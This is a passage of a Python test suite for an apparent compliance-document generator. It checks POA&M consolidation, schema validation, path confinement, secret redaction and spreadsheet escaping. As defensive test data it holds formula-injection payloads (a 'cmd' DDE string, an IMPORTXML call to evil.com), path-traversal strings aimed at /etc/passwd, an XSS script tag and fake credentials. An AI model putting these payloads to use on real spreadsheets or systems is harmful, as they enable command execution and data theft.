                        "isso": {"name": "Charlie Brown"},
                        "authorizing_official": {"name": "Gen. Vance"}
                    },
                    "security_scanners": {
                        "enabled": True,
                        "run_checkov": True,
                        "run_semgrep": False,
                        "ingest_sarif": False
                    }
                }
                integrated_findings = excel_hydrator.derive_poam_findings(scan_inventory)
                self.assertGreater(len(integrated_findings), 0)
                self.assertTrue(any("CKV_GCP_" in item["checks"] for item in integrated_findings))

    def test_poam_duplicate_grouping_and_consolidation(self) -> None:
        """Verifies that findings with the same check/weakness in different locations are consolidated."""
        raw_items = [
            {
                "check_id": "CKV_GCP_74",
                "checks": "CKV_GCP_74",
                "control": "SC-28 Protection of Information at Rest",
                "weakness_name": "Ensure KMS Key rotation is enabled",
                "title": "[CKV_GCP_74] Ensure KMS Key rotation is enabled",
                "desc": "[CKV_GCP_74] Key rotation disabled on kms_key.key_a (modules/kms/a.tf:10)",
                "severity": "Low",
                "sched_date": "2026-11-01",
                "source": "Checkov Static IaC Scanner"
            },
            {
                "check_id": "CKV_GCP_74",
                "checks": "CKV_GCP_74",
                "control": "SC-28 Protection of Information at Rest",
                "weakness_name": "Ensure KMS Key rotation is enabled",
                "title": "[CKV_GCP_74] Ensure KMS Key rotation is enabled",
                "desc": "[CKV_GCP_74] Key rotation disabled on kms_key.key_b (modules/kms/b.tf:20)",
                "severity": "High",
                "sched_date": "2026-10-01",
                "source": "Checkov Static IaC Scanner"
            },
            {
                "check_id": "CKV_GCP_74",
                "checks": "CKV_GCP_74",
                "control": "SC-28 Protection of Information at Rest",
                "weakness_name": "Ensure KMS Key rotation is enabled",
                "title": "[CKV_GCP_74] Ensure KMS Key rotation is enabled",
                "desc": "[CKV_GCP_74] Key rotation disabled on kms_key.key_c (modules/kms/c.tf:30)",
                "severity": "Medium",
                "sched_date": "2026-10-15",
                "source": "Checkov Static IaC Scanner"
            },
            {
                "check_id": "CKV_GCP_82",
                "checks": "CKV_GCP_82",
                "control": "SC-12 Cryptographic Key Establishment and Management",
                "weakness_name": "Ensure KMS keys are protected from deletion",
                "title": "[CKV_GCP_82] Ensure KMS keys are protected from deletion",
                "desc": "[CKV_GCP_82] Deletion protection disabled on kms_key.key_a (modules/kms/a.tf:10)",
                "severity": "High",
                "sched_date": "2026-10-01",
                "source": "Checkov Static IaC Scanner"
            }
        ]

        consolidated = poam_rules.consolidate_poam_items(raw_items, "TEST")
        self.assertEqual(len(consolidated), 2, "3 CKV_GCP_74 items should merge into 1, plus 1 CKV_GCP_82 item")

        ckv_74 = next(i for i in consolidated if "CKV_GCP_74" in i["checks"])
        self.assertEqual(ckv_74["severity"], "High", "Must pick highest severity in cluster")
        self.assertEqual(ckv_74["sched_date"], "2026-10-01", "Must pick earliest target date")
        self.assertIn("3 affected locations", ckv_74["title"])
        self.assertIn("key_a", ckv_74["desc"])
        self.assertIn("key_b", ckv_74["desc"])
        self.assertIn("key_c", ckv_74["desc"])

        test_inv = {
            "system_information": {"system_name": "Test Sys", "system_abbreviation": "TEST"},
            "personnel_roles": {
                "system_owner": {"name": "Alice Smith"},
                "issm": {"name": "Bob Jones"},
                "isso": {"name": "Charlie Brown"},
                "authorizing_official": {"name": "Gen. Vance"}
            },
            "poam_items": raw_items
        }
        yaml_out = generate_compliance_artifacts.generate_poam_matrix_yaml(test_inv)
        self.assertIn("total_open_items: 2", yaml_out)
        self.assertIn("(3 affected locations)", yaml_out)
        self.assertIn("key_b", yaml_out)

    def test_engine_hardening_and_edge_cases(self) -> None:
        """Verifies parser robustness, formula injection defense, and POAM normalization.

        Args:
            None.

        Returns:
            None.
        """
        self.assertIsNone(extract_system_data.parse_yaml_scalar("null"))
        self.assertIsNone(extract_system_data.parse_yaml_scalar("None"))
        self.assertIsNone(extract_system_data.parse_yaml_scalar("~"))
        self.assertEqual(extract_system_data.parse_yaml_scalar("42"), 42)
        self.assertEqual(extract_system_data.parse_yaml_scalar("-10"), -10)
        self.assertEqual(extract_system_data.parse_yaml_scalar("3.14"), 3.14)
        self.assertEqual(extract_system_data.parse_yaml_scalar("-2.718"), -2.718)
        self.assertTrue(extract_system_data.parse_yaml_scalar("true"))
        self.assertFalse(extract_system_data.parse_yaml_scalar("false"))
        self.assertEqual(extract_system_data.parse_yaml_scalar('"quoted text"'), "quoted text")



        self.assertEqual(excel_hydrator.clean_cell_value("=1+1"), "'=1+1")
        self.assertEqual(excel_hydrator.clean_cell_value("@SUM(A1:A5)"), "'@SUM(A1:A5)")
        self.assertEqual(excel_hydrator.clean_cell_value("+cmd|' /C calc'!A0"), "'+cmd|' /C calc'!A0")
        self.assertEqual(excel_hydrator.clean_cell_value("-some_text"), "'-some_text")
        self.assertEqual(excel_hydrator.clean_cell_value("-42"), "-42")
        self.assertEqual(excel_hydrator.clean_cell_value("Normal text"), "Normal text")

        table_row = r"| AC-03 \| SC-07 | Access Enforcement & Cryptography | Enforced |"
        cells = docx_generator.split_markdown_table_row(table_row)
        self.assertEqual(len(cells), 3)
        self.assertEqual(cells[0], "AC-03 | SC-07")

        runs = docx_generator.parse_inline_formatting("**Bold with *star* inside**")
        self.assertIn("<w:b/>", runs)

        norm_item = poam_rules.normalize_poam_item({
            "weakness_name": "Test finding",
            "severity": "medium",
            "status": "in_progress",
            "milestone_status": "open"
        }, sys_abbr="TEST", counter=1, eff_date="2026-09-09")
        self.assertEqual(norm_item["severity"], "Moderate")
        self.assertEqual(norm_item["status"], "Ongoing")
        self.assertEqual(norm_item["milestone_status"], "Open")

        norm_crit = poam_rules.normalize_poam_item({
            "weakness_name": "Critical bug",
            "severity": "critical",
            "status": "closed"
        }, sys_abbr="TEST", counter=2, eff_date="2026-09-09")
        self.assertEqual(norm_crit["severity"], "Very High")
        self.assertEqual(norm_crit["status"], "Completed")

    def test_export_strategy_pattern_and_shared_utilities(self) -> None:
        """Verifies modular Strategy pattern, ExporterRegistry, and file_helpers utilities.

        Args:
            None.

        Returns:
            None.
        """
        import file_helpers
        import utils
        from export_strategies import (
            BasePolicyExporter,
            ExporterRegistry,
        )

        # 1. Test shared file_helpers and utils parity
        self.assertEqual(file_helpers.clean_cell_value("=cmd"), "'=cmd")
        self.assertEqual(utils.clean_cell_value("=cmd"), "'=cmd")
        self.assertEqual(file_helpers.escape_xml_text("<test>"), "&lt;test&gt;")
        self.assertEqual(utils.escape_xml_text("<test>"), "&lt;test&gt;")

        test_row = "| Col A | Col B \\| with pipe | Col C |"
        cells = file_helpers.split_markdown_table_row(test_row)
        self.assertEqual(len(cells), 3)
        self.assertEqual(cells[1], "Col B | with pipe")

        tbl = file_helpers.format_markdown_table(["H1", "H2"], [["V1", "V2"]])
        self.assertIn("| H1 | H2 |", tbl)
        self.assertIn("| V1 | V2 |", tbl)

        bullets = file_helpers.format_bullet_list(["Item 1", "Item 2"])
        self.assertIn("- Item 1", bullets)
        self.assertIn("- Item 2", bullets)

        self.assertEqual(file_helpers.sanitize_identifier("Test System Name #1!"), "test_system_name_1")

        # 2. Test pathlib helpers
        root = file_helpers.get_skill_root()
        self.assertTrue(root.exists())
        self.assertTrue((root / "templates").exists())
        self.assertEqual(file_helpers.get_templates_dir(), root / "templates")
        self.assertEqual(file_helpers.get_scripts_dir(), root / "scripts")

        # 3. Test File I/O helpers
        sample_path = os.path.join(self.test_dir, "sample.txt")
        file_helpers.write_text_file(sample_path, "Hello Compliance Engine")
        self.assertEqual(file_helpers.read_text_file(sample_path), "Hello Compliance Engine")

        sample_json = os.path.join(self.test_dir, "sample.json")
        file_helpers.write_json_file(sample_json, {"key": "value"})
        read_back = file_helpers.read_json_file(sample_json)
        self.assertEqual(read_back.get("key"), "value")

        # 4. Test Strategy Pattern & Custom Exporter Extensibility
        class CustomJsonPolicyExporter(BasePolicyExporter):
            """Mock custom strategy exporting policy deliverables as JSON."""

            @property
            def format_name(self) -> str:
                """Format identifier string for custom JSON exporter.

                Returns:
                    String format identifier 'custom_json'.
                """
                return "custom_json"

            def export_document(
                self,
                markdown_content: str,
                output_base_path: Union[str, file_helpers.Path],
                inventory: Dict[str, Any],
                allowed_boundary: Optional[Union[str, file_helpers.Path]] = None,
            ) -> file_helpers.Path:
                """Exports document to JSON format.

                Args:
                    markdown_content: Markdown text.
                    output_base_path: Base path destination.
                    inventory: System inventory metadata.
                    allowed_boundary: Root boundary confining the write, as required
                        by the AbstractExporter interface.

                Returns:
                    Path to created JSON file.
                """
                target = file_helpers.resolve_path(output_base_path).with_suffix(".json")
                payload = {
                    "system": inventory.get("system_information", {}).get("system_name"),
                    "length": len(markdown_content),
                    "title": target.stem,
                }
                return file_helpers.write_json_file(target, payload)

        # Register custom strategy
        custom_exporter = CustomJsonPolicyExporter()
        ExporterRegistry.register_policy_exporter("custom_json", custom_exporter)
        active_exporters = ExporterRegistry.get_policy_exporters("custom_json")
        self.assertEqual(len(active_exporters), 1)
        self.assertEqual(active_exporters[0].format_name, "custom_json")

        # Run master generation with custom strategy
        inv_path = os.path.join(self.test_dir, "system_inventory.json")
        file_helpers.write_json_file(inv_path, self.mock_inventory)

        results = generate_compliance_artifacts.generate_ato_artifacts(
            self.test_dir, policy_format="custom_json", data_format="yaml"
        )
        self.assertIn("custom_json", results)
        self.assertGreaterEqual(len(results["custom_json"]), 20)

        # Verify custom JSON output
        first_custom_file = results["custom_json"][0]
        self.assertTrue(os.path.exists(first_custom_file))
        custom_data = file_helpers.read_json_file(first_custom_file)
        self.assertEqual(custom_data.get("system"), "Enterprise Secure Cloud Foundation")


    def test_security_audit_safe_parsing_input_validation_and_path_confinement(self) -> None:
        """Verifies safe parsing, schema validation, path traversal defense, and secret scrubbing."""
        import file_helpers

        # ----------------------------------------------------------------------
        # 1. Safe Parsing: JSON & YAML with explicit error handling
        # ----------------------------------------------------------------------
        # Malformed JSON must raise ValueError with diagnostic line/col context
        malformed_json_path = os.path.join(self.test_dir, "corrupted.json")
        file_helpers.write_text_file(malformed_json_path, '{"key": "value", INVALID_JSON_HERE}')
        with self.assertRaises(ValueError) as ctx:
            file_helpers.read_json_file(malformed_json_path)
        self.assertIn("Malformed JSON", str(ctx.exception))
        self.assertIn("line", str(ctx.exception).lower())

        # Safe YAML parsing and file reading
        valid_yaml = "system:\n  name: TestFoundation\n  version: 1.0.0\n"
        parsed_yaml = file_helpers.parse_yaml_safe(valid_yaml)
        self.assertEqual(parsed_yaml.get("system", {}).get("name"), "TestFoundation")

        # ----------------------------------------------------------------------
        # 2. Input Validation: Schema Validation for system_inventory & compliance_config
        # ----------------------------------------------------------------------
        # Valid inventory must pass schema validation
        file_helpers.validate_system_inventory_schema(self.mock_inventory)

        # Invalid: non-dictionary input
        with self.assertRaises(ValueError) as ctx:
            file_helpers.validate_system_inventory_schema(["not", "a", "dict"])
        self.assertIn("Expected a dictionary", str(ctx.exception))

        # Invalid: missing top-level section
        poisoned_inv_1 = copy.deepcopy(self.mock_inventory)
        del poisoned_inv_1["system_information"]
        with self.assertRaises(ValueError) as ctx:
            file_helpers.validate_system_inventory_schema(poisoned_inv_1)
        self.assertIn("Missing required top-level section 'system_information'", str(ctx.exception))

        # Invalid: missing required key in system_information
        poisoned_inv_2 = copy.deepcopy(self.mock_inventory)
        del poisoned_inv_2["system_information"]["organization"]
        with self.assertRaises(ValueError) as ctx:
            file_helpers.validate_system_inventory_schema(poisoned_inv_2)
        self.assertIn("system_information.organization", str(ctx.exception))

        # Invalid: missing required personnel role
        poisoned_inv_3 = copy.deepcopy(self.mock_inventory)
        del poisoned_inv_3["personnel_roles"]["authorizing_official"]
        with self.assertRaises(ValueError) as ctx:
            file_helpers.validate_system_inventory_schema(poisoned_inv_3)
        self.assertIn("personnel_roles.authorizing_official", str(ctx.exception))

        # Validation on compliance_config schema
        valid_cfg = {
            "system_information": {"organization": "TestOrg", "system_name": "TestSys"},
            "personnel_roles": {"authorizing_official": {"name": "Jane Doe"}},
            "export_preferences": {"policy_formats": "both", "structured_data_formats": "both"},
        }
        file_helpers.validate_compliance_config_schema(valid_cfg)

        invalid_cfg = {"personnel_roles": "not-a-dict"}
        with self.assertRaises(ValueError) as ctx:
            file_helpers.validate_compliance_config_schema(invalid_cfg)
        self.assertIn("'personnel_roles' must be a dictionary", str(ctx.exception))

        # Poisoned system_inventory.json rejects load_system_inventory
        poisoned_inv_path = os.path.join(self.test_dir, "system_inventory.json")
        file_helpers.write_json_file(poisoned_inv_path, {"incomplete": "data"})
        with self.assertRaises(ValueError) as ctx:
            generate_compliance_artifacts.load_system_inventory(self.test_dir)
        self.assertIn("Invalid system_inventory schema", str(ctx.exception))

        # Restore valid inventory
        file_helpers.write_json_file(poisoned_inv_path, self.mock_inventory)

        # ----------------------------------------------------------------------
        # 3. Path Traversal Defense & Boundary Confinement
        # ----------------------------------------------------------------------
        allowed_root = Path(self.test_dir) / "ato_artifacts"
        file_helpers.ensure_directory(allowed_root)

        # Valid subpath inside boundary
        valid_target = allowed_root / "SSP" / "SSP_System_Security_Plan.md"
        resolved_valid = file_helpers.ensure_path_within_boundary(valid_target, allowed_root)
        self.assertEqual(resolved_valid, valid_target.resolve())

        # Path traversal with relative ../ escaping allowed root
        escaped_relative = allowed_root / ".." / "outside.txt"
        with self.assertRaises(PermissionError) as ctx:
            file_helpers.ensure_path_within_boundary(escaped_relative, allowed_root)
        self.assertIn("Path traversal detected", str(ctx.exception))

        # Path traversal with absolute path escaping allowed root
        escaped_absolute = Path("/etc/passwd")
        with self.assertRaises(PermissionError) as ctx:
            file_helpers.ensure_path_within_boundary(escaped_absolute, allowed_root)
        self.assertIn("Path traversal detected", str(ctx.exception))

        # Filename sanitization
        dirty_filename = "../../etc/passwd"
        cleaned_filename = file_helpers.sanitize_filename(dirty_filename)
        self.assertNotIn("/", cleaned_filename)
        self.assertNotIn("..", cleaned_filename)

        dirty_null_bytes = "report\x00_2026.docx"
        cleaned_null = file_helpers.sanitize_filename(dirty_null_bytes)
        self.assertNotIn("\x00", cleaned_null)

        # ----------------------------------------------------------------------
        # 4. Terraform Extraction: Sensitive Variable & Secret Scrubbing
        # ----------------------------------------------------------------------
        tfvars_snippet = """
        environment       = "production"
        region            = "us-central1"
        db_password       = "SuperSecretPassword123!"
        api_token         = "ghp_abcdef1234567890"
        ssl_private_key   = "-----BEGIN PRIVATE KEY-----\nMIIEvgIBADANBgk...\n-----END PRIVATE KEY-----"
        instance_count    = 3
        """
        parsed_vars = extract_system_data.parse_tfvars_content(tfvars_snippet)
        # Normal metadata must be captured
        self.assertEqual(parsed_vars.get("environment"), "production")
        self.assertEqual(parsed_vars.get("region"), "us-central1")
        self.assertEqual(parsed_vars.get("instance_count"), 3)
        # Secrets MUST be redacted
        self.assertEqual(parsed_vars.get("db_password"), "[REDACTED_SENSITIVE]")
        self.assertEqual(parsed_vars.get("api_token"), "[REDACTED_SENSITIVE]")
        self.assertEqual(parsed_vars.get("ssl_private_key"), "[REDACTED_SENSITIVE]")

        # Sensitive = true in variable block
        var_block_snippet = """
        variable "db_credentials" {
          description = "Database master credentials"
          type        = string
          default     = "plaintext_admin_pass"
          sensitive   = true
        }
        variable "public_cidr" {
          type    = string
          default = "10.0.0.0/16"
        }
        """
        parsed_block_vars = extract_system_data.parse_tfvars_content(var_block_snippet)
        self.assertEqual(parsed_block_vars.get("db_credentials"), "[REDACTED_SENSITIVE]")
        self.assertEqual(parsed_block_vars.get("public_cidr"), "10.0.0.0/16")

        # Recursive sensitive data scrubber
        nested_data = {
            "system_name": "Cloud Secure System",
            "db_secret": "raw_db_secret_key",
            "private_key_pem": "-----BEGIN RSA PRIVATE KEY-----\nFAKE_KEY\n-----END RSA PRIVATE KEY-----",
            "components": [
                {"name": "web", "port": 443},
                {"name": "auth", "token": "oauth2_bearer_secret"},
            ],
        }
        scrubbed = file_helpers.scrub_sensitive_data(nested_data)
        self.assertEqual(scrubbed["system_name"], "Cloud Secure System")
        self.assertEqual(scrubbed["db_secret"], "[REDACTED_SENSITIVE]")
        self.assertEqual(scrubbed["private_key_pem"], "[REDACTED_SENSITIVE]")
        self.assertEqual(scrubbed["components"][0]["port"], 443)
        self.assertEqual(scrubbed["components"][1]["token"], "[REDACTED_SENSITIVE]")

    def test_parameterized_format_combinations(self) -> None:
        """Tests compliance generation across format combinations using parameterized subtests.

        Simulates pytest.mark.parametrize across permutations of --policy-format
        ('both', 'markdown', 'docx') and --data-format ('both', 'yaml', 'excel')
        to verify that the orchestrator and strategy registry generate exactly the
        expected file formats without leaking unrequested artifact types.

        Args:
            None.

        Returns:
            None.
        """
        permutations = [
            ("both", "both"),
            ("markdown", "yaml"),
            ("docx", "excel"),
            ("markdown", "excel"),
            ("docx", "yaml"),
        ]

        min_tpl_dir = Path(self.test_dir) / "minimal_param_templates"
        (min_tpl_dir / "policies").mkdir(parents=True, exist_ok=True)
        shutil.copy(
            os.path.join(TEMPLATES_DIR, "policies", "Access_Control_Policy_and_Procedures.md"),
            min_tpl_dir / "policies" / "Access_Control_Policy_and_Procedures.md",
        )

        def mock_hydrate_excel(target_dir, inv):
            out = {}
            for name in ["hwsw", "poam", "ppsm", "sctm"]:
                folder = "HW_SW_Inventory" if name == "hwsw" else name.upper()
                fname = "Hardware_Software_Inventory.xlsm" if name == "hwsw" else (
                    "Plan_of_Action_and_Milestones.xlsm" if name == "poam" else (
                        "PPSM_Ports_Protocols_Services.xlsm" if name == "ppsm" else "SCTM_Burndown_Matrix.xlsm"
                    )
                )
                p = os.path.join(str(target_dir), "ato_artifacts", folder, fname)
                os.makedirs(os.path.dirname(p), exist_ok=True)
                with open(p, "wb") as f:
                    f.write(b"PK\x03\x04")
                out[name] = p
            return out

        with unittest.mock.patch("generate_compliance_artifacts.TEMPLATES_DIR", str(min_tpl_dir)):
            with unittest.mock.patch("excel_hydrator.hydrate_all_excel_templates", side_effect=mock_hydrate_excel):
                for pf, df in permutations:
                    with self.subTest(policy_format=pf, data_format=df):
                        sub_target = Path(self.test_dir) / f"param_{pf}_{df}"
                        sub_target.mkdir(parents=True, exist_ok=True)

                        # Prepare inventory with specific export preferences
                        inv_copy = copy.deepcopy(self.mock_inventory)
                        inv_copy["export_preferences"] = {
                            "policy_formats": pf,
                            "structured_data_formats": df,
                        }
                        inv_path = sub_target / "system_inventory.json"
                        file_helpers.write_json_file(inv_path, inv_copy)

                        # Execute master generation with specified formats
                        results = generate_compliance_artifacts.generate_ato_artifacts(
                            sub_target, policy_format=pf, data_format=df
                        )

                    # 1. Verify policy format outputs
                    if pf in ("markdown", "both"):
                        self.assertIn("markdown", results)
                        self.assertGreater(len(results["markdown"]), 0)
                        for md_file in results["markdown"]:
                            self.assertTrue(md_file.endswith(".md"), f"{md_file} must have .md extension")
                            self.assertTrue(os.path.exists(md_file), f"{md_file} must exist on disk")
                    else:
                        self.assertEqual(len(results.get("markdown", [])), 0)

                    if pf in ("docx", "both"):
                        self.assertIn("docx", results)
                        self.assertGreater(len(results["docx"]), 0)
                        for docx_file in results["docx"]:
                            self.assertTrue(docx_file.endswith(".docx"), f"{docx_file} must have .docx extension")
                            self.assertTrue(os.path.exists(docx_file), f"{docx_file} must exist on disk")
                    else:
                        self.assertEqual(len(results.get("docx", [])), 0)

                    # 2. Verify structured data format outputs
                    if df in ("yaml", "both"):
                        self.assertIn("yaml", results)
                        self.assertGreater(len(results["yaml"]), 0)
                        for yml_file in results["yaml"]:
                            self.assertTrue(yml_file.endswith(".yaml"), f"{yml_file} must have .yaml extension")
                            self.assertTrue(os.path.exists(yml_file), f"{yml_file} must exist on disk")
                    else:
                        self.assertEqual(len(results.get("yaml", [])), 0)

                    if df in ("excel", "both"):
                        self.assertIn("excel", results)
                        self.assertGreater(len(results["excel"]), 0)
                        for xl_file in results["excel"]:
                            self.assertTrue(
                                xl_file.endswith(".xlsm") or xl_file.endswith(".xlsx"),
                                f"{xl_file} must be an Excel workbook",
                            )
                            self.assertTrue(os.path.exists(xl_file), f"{xl_file} must exist on disk")
                    else:
                        self.assertEqual(len(results.get("excel", [])), 0)

    def test_malformed_and_incomplete_terraform_extraction(self) -> None:
        """Tests that system data extraction gracefully tolerates malformed or incomplete inputs.

        Verifies that parser and extractor routines handle corrupted HCL files,
        unterminated blocks, unclosed strings, empty files, malformed JSON, and
        syntax garbage without crashing or raising unhandled exceptions, while
        still extracting valid resources defined in co-located files.

        Args:
            None.

        Returns:
            None.
        """
        malformed_dir = Path(self.test_dir) / "malformed_workspace"
        malformed_dir.mkdir(parents=True, exist_ok=True)
        tf_dir = malformed_dir / "terraform"
        tf_dir.mkdir(parents=True, exist_ok=True)

        # 1. Create various corrupted / malformed inputs
        file_helpers.write_text_file(tf_dir / "empty.tf", "")

        unterminated_hcl = """
        resource "google_compute_instance" "broken_vm" {
          name         = "broken-instance"
          machine_type = "e2-medium"
          # Missing closing brace
        """
        file_helpers.write_text_file(tf_dir / "unterminated.tf", unterminated_hcl)

        syntax_garbage = """
        @@@### NOT TERRAFORM CODE $$$%%%^^^
        === invalid tokens === !!!
        <<< broken >>>
        """
        file_helpers.write_text_file(tf_dir / "garbage.tf", syntax_garbage)

        unterminated_heredoc = """
        locals {
          broken_script = <<-EOF
            echo "never ending heredoc"
        """
        file_helpers.write_text_file(tf_dir / "heredoc.tf", unterminated_heredoc)

        invalid_tfvars = """
        invalid = = = = syntax
        just_a_word_without_assignment
        """
        file_helpers.write_text_file(tf_dir / "terraform.tfvars", invalid_tfvars)

        file_helpers.write_text_file(tf_dir / "variables.tfvars.json", '{"unterminated_json": ')

        # 2. Add legitimate resources in a valid file
        valid_hcl = """
        resource "google_compute_network" "resilient_vpc" {
          name                    = "vpc-resilient-prod"
          auto_create_subnetworks = false
        }

        resource "google_storage_bucket" "resilient_bucket" {
          name     = "resilient-audit-evidence-bucket"
          location = "us-central1"
        }

        resource "google_kms_crypto_key" "resilient_key" {
          name     = "key-resilient-cmek"
          key_ring = "projects/p/locations/us/keyRings/kr"
        }
        """
        file_helpers.write_text_file(tf_dir / "valid_infra.tf", valid_hcl)

        # 3. Add baseline compliance config
        valid_cfg = """
        organization:
          system_name: "Resilient System"
          abbreviation: "RS"
          agency: "Department of Defense"
          impact_level: "IL5"
        personnel:
          authorizing_official:
            name: "AO Officer"
            email: "ao@example.mil"
          system_owner:
            name: "SO Officer"
            email: "so@example.mil"
          issm:
            name: "ISSM Officer"
            email: "issm@example.mil"
          isso:
            name: "ISSO Officer"
            email: "isso@example.mil"
        """
        file_helpers.write_text_file(malformed_dir / "compliance_config.yaml", valid_cfg)

        # 4. Test direct helper resilience
        parsed_vars = extract_system_data.parse_tfvars_content(invalid_tfvars)
        self.assertIsInstance(parsed_vars, dict)

        tf_scanned = extract_system_data.deep_scan_tf_files(malformed_dir)
        self.assertIsInstance(tf_scanned, dict)
        all_res = tf_scanned.get("all_resources", [])
        res_names = [r.get("name") for r in all_res]
        self.assertIn("resilient_vpc", res_names)
        self.assertIn("resilient_bucket", res_names)

        # 5. Test full live system extraction end-to-end
        out_inv = extract_system_data.extract_system_inventory(malformed_dir)
        out_inv_path = os.path.join(malformed_dir, "system_inventory.json")
        self.assertTrue(os.path.exists(out_inv_path))

        # Verify schema validity (raises ValueError on failure)
        file_helpers.validate_system_inventory_schema(out_inv)

        # Verify valid resources were extracted despite adjacent broken files
        vpcs = out_inv.get("network_architecture", {}).get("vpcs", [])
        self.assertIn("vpc-resilient-prod", vpcs)

        buckets = [
            b.get("name")
            for b in out_inv.get("infrastructure_components", {}).get("storage_buckets", [])
        ]
        self.assertIn("resilient-audit-evidence-bucket", buckets)

    def test_openxml_generators_formatting_edge_cases(self) -> None:
        """Tests docx_generator and excel_hydrator resilience against formatting edge cases.

        Validates handling of:
        1. Illegal XML 1.0 control characters (null bytes, bell, vertical tab, form feed).
        2. Extremely long text blocks (50,000+ characters) in paragraphs, tables, and cells.
        3. Formula injection payloads (=SUM, +CMD, @IMPORT, -1+1).
        4. Empty variable arrays and null inputs across templates.

        Args:
            None.

        Returns:
            None.
        """
        # ----------------------------------------------------------------------
        # 1. docx_generator edge cases
        # ----------------------------------------------------------------------
        huge_text_block = "Alpha " * 10000  # 60,000 characters
        edge_markdown = f"""# Edge Case Document Title \x00\x01\x07\x08

## Section 1: Illegal Characters and Entities
This text contains null bytes (\x00), form feed (\x0c), bell (\x07), vertical tab (\x0b),
and standard entities like <script>alert("XSS & Injection")</script> and &amp; &lt; &gt;.

> [!CAUTION]
> Action Required Callout with control char: \x1f and long narrative: {huge_text_block[:1000]}

## Section 2: Huge Text Block
{huge_text_block}

## Section 3: Edge Case Table
| Control ID | Title with \x00 Null | Massive Narrative Cell | Empty Cell |
| --- | --- | --- | --- |
| AC-1 | Policy with & < > " ' | {"Beta " * 2000} | |
| AC-2 | Escaped Pipe \\| Here | Second row content | Value |
| | Empty Row Test | | |
"""
        edge_docx_path = Path(self.test_dir) / "edge_case_output.docx"
        meta = {
            "system_information": {
                "organization": "Org\x0bWith\x1fSpecial&Chars",
            }
        }
        docx_generator.convert_markdown_to_docx(
            edge_markdown,
            str(edge_docx_path),
            metadata=meta,
        )
        self.assertTrue(edge_docx_path.exists())

        # Inspect generated docx archive and ensure every internal XML is valid XML 1.0
        with zipfile.ZipFile(edge_docx_path, "r") as zf:
            xml_targets = [
                "word/document.xml",
                "docProps/core.xml",
                "word/header1.xml",
                "word/footer1.xml",
            ]
            for target_xml in xml_targets:
                self.assertIn(target_xml, zf.namelist())
                raw_xml = zf.read(target_xml)
                # Parsing with defusedxml/ET must succeed without ParseError
                root = ET.fromstring(raw_xml)
                self.assertIsNotNone(root)

        # ----------------------------------------------------------------------
        # 2. excel_hydrator and clean_cell_value edge cases
        # ----------------------------------------------------------------------
        dirty_val = "value\x00with\x07control\x0bchars\x0c\x1f\x7f"
        clean_val = file_helpers.clean_cell_value(dirty_val)
        self.assertEqual(clean_val, "valuewithcontrolchars")

        huge_cell = "=SUM(" + ("A1," * 12000) + "A2)"  # ~50,000 chars
        clean_huge = file_helpers.clean_cell_value(huge_cell)
        self.assertLessEqual(len(str(clean_huge)), 32767)
        self.assertTrue(str(clean_huge).startswith("'="))
        self.assertTrue(str(clean_huge).endswith("..."))

        self.assertEqual(file_helpers.clean_cell_value("=1+1"), "'=1+1")
        self.assertEqual(file_helpers.clean_cell_value("+cmd|' /C calc'!A0"), "'+cmd|' /C calc'!A0")
        self.assertEqual(file_helpers.clean_cell_value("@IMPORTXML('http://evil.com')"), "'@IMPORTXML('http://evil.com')")
        self.assertEqual(file_helpers.clean_cell_value("-some_variable_name"), "'-some_variable_name")
        self.assertEqual(file_helpers.clean_cell_value("-42.5"), "-42.5")  # Valid numeric string not escaped with '
        self.assertEqual(file_helpers.clean_cell_value(-42.5), -42.5)  # Float value preserved as float

        # Test Excel hydration with completely empty inventory arrays
        empty_inv = copy.deepcopy(self.mock_inventory)
        empty_inv["infrastructure_components"] = {
            "services_enabled": [],
            "storage_buckets": [],
            "gke_clusters": [],
            "databases": [],
            "kms_keys": [],
            "compute_instances": [],
            "service_accounts": [],
            "modules_used": [],
        }
        empty_inv["network_architecture"] = {
            "vpcs": [],
            "subnets_cidrs": [],
            "firewall_rules": [],
        }
        empty_inv["application_components"] = {
            "applications": [],
            "software_packages": [],
            "container_images": [],
            "exposed_ports": [],
        }

        empty_target = Path(self.test_dir) / "empty_target"
        empty_target.mkdir(parents=True, exist_ok=True)
        file_helpers.write_json_file(empty_target / "system_inventory.json", empty_inv)

        hydrated = excel_hydrator.hydrate_all_excel_templates(empty_target, empty_inv)
        self.assertIn("hwsw", hydrated)
        self.assertIn("poam", hydrated)
        self.assertIn("ppsm", hydrated)
        self.assertIn("sctm", hydrated)

        for book_name, book_path in hydrated.items():
            self.assertTrue(os.path.exists(book_path))
            wb = openpyxl.load_workbook(book_path, data_only=True)
            self.assertGreater(len(wb.sheetnames), 0)
            wb.close()

    def test_zero_artifact_residue_and_workspace_cleanliness(self) -> None:
        """Verifies that compliance generation leaves zero file residue outside test boundaries.

        Ensures that execution of system data extraction, artifact generation,
        and OpenXML packaging creates all deliverables strictly inside the
        designated temporary target directory, and leaves no residual files,
        orphan temporary files, or directory leaks in the workspace root or CWD.

        Args:
            None.

        Returns:
            None.
        """
        cwd_path = Path.cwd().resolve()
        initial_cwd_entries = set(cwd_path.iterdir())

        # Execute full lifecycle within an isolated temporary directory
        with tempfile.TemporaryDirectory(prefix="residue_test_") as temp_workspace:
            ws_path = Path(temp_workspace).resolve()

            # Create minimal valid infrastructure and config
            tf_folder = ws_path / "terraform"
            tf_folder.mkdir(parents=True, exist_ok=True)
            file_helpers.write_text_file(
                tf_folder / "main.tf",
                'resource "google_storage_bucket" "b" { name = "iso-bucket" location = "US" }',
            )

            cfg_content = """
            organization:
              system_name: "Clean Isolation System"
              abbreviation: "CIS"
              agency: "Secure Agency"
              impact_level: "IL5"
            personnel:
              authorizing_official:
                name: "AO Officer"
                email: "ao@example.gov"
              system_owner:
                name: "SO Officer"
                email: "so@example.gov"
              issm:
                name: "ISSM Officer"
                email: "issm@example.gov"
              isso:
                name: "ISSO Officer"
                email: "isso@example.gov"
            """
            file_helpers.write_text_file(ws_path / "compliance_config.yaml", cfg_content)

            # Step 1: Extract system data
            out_inv = extract_system_data.extract_system_inventory(ws_path)
            inv_file = ws_path / "system_inventory.json"
            self.assertTrue(inv_file.exists())
            self.assertEqual(inv_file.resolve().parent, ws_path)

            # Create minimal template directory to verify all formats without redundant 29-doc packaging
            min_tpl_dir = ws_path / "min_templates"
            (min_tpl_dir / "policies").mkdir(parents=True, exist_ok=True)
            shutil.copy(
                os.path.join(TEMPLATES_DIR, "policies", "Access_Control_Policy_and_Procedures.md"),
                min_tpl_dir / "policies" / "Access_Control_Policy_and_Procedures.md",
            )
            (min_tpl_dir / "ssp").mkdir(parents=True, exist_ok=True)
            shutil.copy(
